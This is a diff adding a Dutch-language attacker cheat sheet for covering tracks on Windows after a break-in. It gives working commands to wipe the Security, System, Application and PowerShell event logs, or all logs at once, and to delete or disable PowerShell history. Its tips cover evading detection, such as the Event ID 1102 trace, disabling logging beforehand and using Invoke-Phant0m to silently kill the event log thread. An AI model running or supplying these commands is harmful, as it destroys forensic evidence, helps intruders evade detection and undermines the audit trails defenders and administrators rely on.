@@ -1,0 +1,21 @@
+# Event Log Wissen - Sporen verwijderen na een aanval
+# Vereist: Administrator/SYSTEM rechten
+# Alle logs wissen (luidruchtig!):
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+wevtutil cl "Windows PowerShell"
+wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+# Via PowerShell:
+Get-WinEvent -ListLog * | ForEach-Object { wevtutil cl $_.LogName 2>$null }
+# Specifiek log wissen:
+Clear-EventLog -LogName Security
+# Alleen recente entries verwijderen (stealthier, vereist tool):
+# Gebruik Invoke-Phant0m om Event Log thread te killen
+# PowerShell history wissen:
+Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
+# Of historie uitschakelen voor sessie:
+Set-PSReadLineOption -HistorySaveStyle SaveNothing
+# Tip: Event ID 1102 logt dat het Security log gewist is (altijd zichtbaar!)
+# Tip: Beter: schakel logging uit ipv achteraf wissen
+# Tip: Phantom: stopt de Event Log Service thread zonder de service te stoppen
